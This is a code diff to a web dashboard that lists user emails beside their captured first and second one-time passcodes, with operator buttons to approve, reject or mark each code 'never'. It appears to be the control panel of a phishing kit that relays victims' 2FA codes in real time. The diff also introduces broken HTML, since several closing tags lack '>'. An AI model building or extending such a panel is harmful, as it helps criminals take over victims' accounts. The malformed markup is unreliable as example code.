@@ -33,6 +33,89 @@ body.light-mode {
   animation: none;
 }
 
+/* Facebook-style verified badge */
+.badge-verified {
+  background: linear-gradient(135deg, #1877f2 0%, #0c63d4 100%);
+  color: white;
+  border: none;
+  font-weight: 600;
+  letter-spacing: 0.5px;
+  box-shadow: 0 2px 8px rgba(24, 119, 242, 0.3);
+}
+
+.badge-verified ion-icon {
+  font-size: 16px;
+  color: white;
+}
+
+.verified-badge {
+  display: inline-flex;
+  align-items: center;
+  margin-left: 6px;
+  vertical-align: middle;
+}
+
+.verified-badge ion-icon {
+  font-size: 18px;
+  color: #1877f2;
+  filter: drop-shadow(0 1px 2px rgba(0, 0, 0, 0.1));
+  cursor: pointer;
+  transition: transform 0.2s ease;
+}
+
+.verified-badge ion-icon:hover {
+  transform: scale(1.1);
+}
+
+/* Light mode verified badge adjustments */
+body.light-mode .verified-badge ion-icon {
+  color: #1877f2;
+}
+
+body.light-mode .badge-verified {
+  background: linear-gradient(135deg, #1877f2 0%, #0c63d4 100%);
+  color: white;
+}
+
+/* Dark mode verified badge */
+body.dark-mode .verified-badge ion-icon {
+  color: #3b82f6;
+  filter: drop-shadow(0 1px 2px rgba(0, 0, 0, 0.3));
+}
+
+/* Animation for verified badge */
+@keyframes verifiedPop {
+  0% { transform: scale(0.8); opacity: 0; }
+  80% { transform: scale(1.1); }
+  100% { transform: scale(1); opacity: 1; }
+}
+
+.verified-badge ion-icon {
+  animation: verifiedPop 0.3s ease-out;
+}
+
+/* Tooltip for verified badge */
+.verified-badge {
+  position: relative;
+}
+
+.verified-badge:hover::after {
+  content: "Verified User";
+  position: absolute;
+  bottom: 100%;
+  left: 50%;
+  transform: translateX(-50%);
+  background: rgba(0, 0, 0, 0.8);
+  color: white;
+  padding: 4px 8px;
+  border-radius: 6px;
+  font-size: 11px;
+  white-space: nowrap;
+  z-index: 1000;
+  pointer-events: none;
+  margin-bottom: 5px;
+}
+  
 body.light-mode .glass-navbar,
 body.light-mode .stat-card,
 body.light-mode .table-container,
@@ -591,16 +674,16 @@ td:nth-child(5) {
 
   <div class="table-container">
     <table>
-      <thead>
-        <tr>
-          <th>Email</th>
-          <th>First OTP</th>
-          <th>Second OTP</th>
-          <th>Status</th>
-          <th>Created Date</th>
-          <th>Actions</th>
-        </tr>
-      </thead>
+<thead>
+  <tr>
+    <th>Email</th>
+    <th>First OTP</th>
+    <th>Second OTP</th>
+    <th>Status</th>
+    <th>Created Date</th>
+    <th>Actions</th>
+  </tr>
+</thead>
       <tbody id="usersTableBody">
         <tr><td colspan="5" style="text-align:center; padding:40px;">Loading...</td</tr>
       </tbody>
@@ -865,28 +948,34 @@ function escapeHtml(str) {
 }
 
 // Modified displayUsers function with date column
-// Modified displayUsers function with date column - PROPERLY ALIGNED
+// MODIFIED displayUsers function with all features
 function displayUsers(users) {
   const tbody = document.getElementById('usersTableBody');
   if (!users.length) {
-    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; padding:40px;">No users</td></tr>';
+    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; padding:40px;">No users</td</tr>';
     return;
   }
   
   tbody.innerHTML = users.map(user => {
     let statusBadge = '';
     let actionButtons = '';
+    const isFullyVerified = user.approved && user.otp1_correct === true && user.otp2_correct === true;
     
     if (!user.approved) {
       statusBadge = '<span class="badge badge-email"><ion-icon name="mail-outline"></ion-icon> Pending Email</span>';
       actionButtons = `<button class="glass-action-btn approve-email-btn" onclick="approveEmail('${escapeHtml(user.email)}')"><ion-icon name="checkmark-outline"></ion-icon> Approve</button>
                       <button class="glass-action-btn delete-btn" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
     } 
-    else if (user.approved && user.otp && !user.otp1_correct) {
+    else if (user.approved && user.otp && !user.otp1_correct && !user.otp1_never) {
       statusBadge = '<span class="badge badge-waiting"><ion-icon name="key-outline"></ion-icon> OTP 1 Pending</span>';
       actionButtons = `<button class="glass-action-btn approve-first-btn" onclick="approveFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="checkmark-circle-outline"></ion-icon> Approve</button>
+                      <button class="glass-action-btn never-btn" onclick="neverFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="ban-outline"></ion-icon> Never</button>
                       <button class="glass-action-btn incorrect-btn" onclick="incorrectFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="close-circle-outline"></ion-icon> Incorrect</button>
                       <button class="glass-action-btn delete-btn" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
+    }
+    else if (user.approved && user.otp && user.otp1_never) {
+      statusBadge = '<span class="badge badge-never"><ion-icon name="ban-outline"></ion-icon> OTP 1 Never</span>';
+      actionButtons = `<button class="glass-action-btn delete-btn" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
     }
     else if (user.approved && user.otp1_correct && user.second_otp && !user.otp2_correct) {
       statusBadge = '<span class="badge badge-waiting"><ion-icon name="shield-checkmark-outline"></ion-icon> OTP 2 Pending</span>';
@@ -894,12 +983,15 @@ function displayUsers(users) {
                       <button class="glass-action-btn incorrect-btn" onclick="incorrectSecondOTP('${escapeHtml(user.email)}')"><ion-icon name="close-circle-outline"></ion-icon> Incorrect</button>
                       <button class="glass-action-btn delete-btn" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
     }
+    else if (isFullyVerified) {
+      statusBadge = '<span class="badge badge-verified"><ion-icon name="checkmark-done-circle-outline"></ion-icon> Verified</span>';
+      actionButtons = `<button class="glass-action-btn delete-btn" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
+    }
     else {
-      statusBadge = '<span class="badge badge-approved"><ion-icon name="checkmark-done-outline"></ion-icon> Verified</span>';
+      statusBadge = '<span class="badge badge-approved"><ion-icon name="checkmark-outline"></ion-icon> Approved</span>';
       actionButtons = `<button class="glass-action-btn delete-btn" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
     }
     
-    // Format the creation date from the database
     let formattedDate = '-';
     if (user.created_at) {
       const date = new Date(user.created_at);
@@ -914,18 +1006,45 @@ function displayUsers(users) {
       });
     }
     
-    // PROPER TABLE ROW WITH CORRECTLY CLOSED TD TAGS
+    let otp1Display = '';
+    if (user.otp1_never) {
+      otp1Display = '<span class="badge badge-never"><ion-icon name="ban-outline"></ion-icon> Never</span>';
+    } else if (user.otp) {
+      otp1Display = `<div class="otp-cell"><span class="otp-code">${escapeHtml(user.otp)}</span><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.otp)}')"><ion-icon name="copy-outline"></ion-icon></button></div>`;
+    } else {
+      otp1Display = '<span class="badge badge-pending">-</span>';
+    }
+    
+    const verifiedIcon = isFullyVerified ? '<span class="verified-badge" title="Verified User"><ion-icon name="checkmark-done-circle"></ion-icon></span>' : '';
+    
     return `<tr>
-      <td><div class="email-cell"><span>${escapeHtml(user.email)}</span><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.email)}')"><ion-icon name="copy-outline"></ion-icon></button></div></td>
-      <td>${user.otp ? `<div class="otp-cell"><span class="otp-code">${escapeHtml(user.otp)}</span><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.otp)}')"><ion-icon name="copy-outline"></ion-icon></button></div>` : '<span class="badge badge-pending">-</span>'}</td>
-      <td>${user.second_otp ? `<div class="otp-cell"><span class="otp-code">${escapeHtml(user.second_otp)}</span><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.second_otp)}')"><ion-icon name="copy-outline"></ion-icon></button></div>` : '<span class="badge badge-pending">-</span>'}</td>
-      <td>${statusBadge}</td>
-      <td><span style="font-size: 12px; font-family: monospace; white-space: nowrap;">${formattedDate}</span></td>
-      <td>${actionButtons}</td>
+      <td><div class="email-cell"><span>${escapeHtml(user.email)}</span>${verifiedIcon}<button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.email)}')"><ion-icon name="copy-outline"></ion-icon></button></div></td
+      <td>${otp1Display}</td
+      <td>${user.second_otp ? `<div class="otp-cell"><span class="otp-code">${escapeHtml(user.second_otp)}</span><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.second_otp)}')"><ion-icon name="copy-outline"></ion-icon></button></div>` : '<span class="badge badge-pending">-</span>'}</td
+      <td>${statusBadge}</td
+      <td><span style="font-size: 12px; font-family: monospace; white-space: nowrap;">${formattedDate}</span></td
+      <td>${actionButtons}</td
     </tr>`;
   }).join('');
-
 }
+
+// ADD the neverFirstOTP function
+async function neverFirstOTP(email) { 
+  if (!confirm(`Mark ${email} as NEVER? This will permanently mark OTP1 as invalid.`)) return;
+  try { 
+    await fetch('/api/admin/never-first-otp', { 
+      method: 'POST', 
+      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, 
+      body: JSON.stringify({ email }) 
+    }); 
+    loadUsers(); 
+    speakText('Marked as never', true);
+    showNotification('Never Marked', `${email} marked as never - OTP will permanently show as invalid`, 'never');
+  } catch(e) {} 
+}
+
+// ADD to window exports
+window.neverFirstOTP = neverFirstOTP;
 
 async function approveEmail(email) { 
   try { 
